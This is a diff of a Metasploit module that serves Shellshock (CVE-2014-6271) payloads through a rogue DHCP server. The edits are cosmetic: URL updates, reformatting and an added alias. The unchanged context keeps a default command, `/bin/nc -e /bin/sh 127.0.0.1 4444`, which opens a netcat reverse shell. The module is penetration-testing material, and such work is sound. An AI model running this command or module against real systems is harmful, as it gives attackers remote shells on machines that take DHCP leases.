@@ -1,13 +1,11 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
 require 'rex/proto/dhcp'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::DHCPServer
 
   def initialize
@@ -37,21 +35,25 @@ class MetasploitModule < Msf::Auxiliary
         ],
       'DefaultAction'  => 'Service',
       'References' => [
-        ['CVE', '2014-6271'],
-        ['CWE', '94'],
-        ['OSVDB', '112004'],
-        ['EDB', '34765'],
-        ['URL', 'https://securityblog.redhat.com/2014/09/24/bash-specially-crafted-environment-variables-code-injection-attack/'],
-        ['URL', 'http://seclists.org/oss-sec/2014/q3/649'],
-        ['URL', 'https://www.trustedsec.com/september-2014/shellshock-dhcp-rce-proof-concept/']
+        [ 'CVE', '2014-6271' ],
+        [ 'CWE', '94' ],
+        [ 'OSVDB', '112004' ],
+        [ 'EDB', '34765' ],
+        [ 'URL', 'https://securityblog.redhat.com/2014/09/24/bash-specially-crafted-environment-variables-code-injection-attack/' ],
+        [ 'URL', 'https://seclists.org/oss-sec/2014/q3/649' ],
+        [ 'URL', 'https://www.trustedsec.com/september-2014/shellshock-dhcp-rce-proof-concept/' ]
       ],
-      'DisclosureDate' => 'Sep 24 2014'
+      'DisclosureDate' => 'Sep 24 2014',
+      'Notes' =>
+          {
+              'AKA' => ['Shellshock']
+          }
     )
 
     register_options(
       [
         OptString.new('CMD', [ true, 'The command to run', '/bin/nc -e /bin/sh 127.0.0.1 4444'])
-      ], self.class)
+      ])
 
     deregister_options('DOMAINNAME', 'HOSTNAME', 'URL')
   end
@@ -82,5 +84,4 @@ class MetasploitModule < Msf::Auxiliary
       end
     end
   end
-
 end
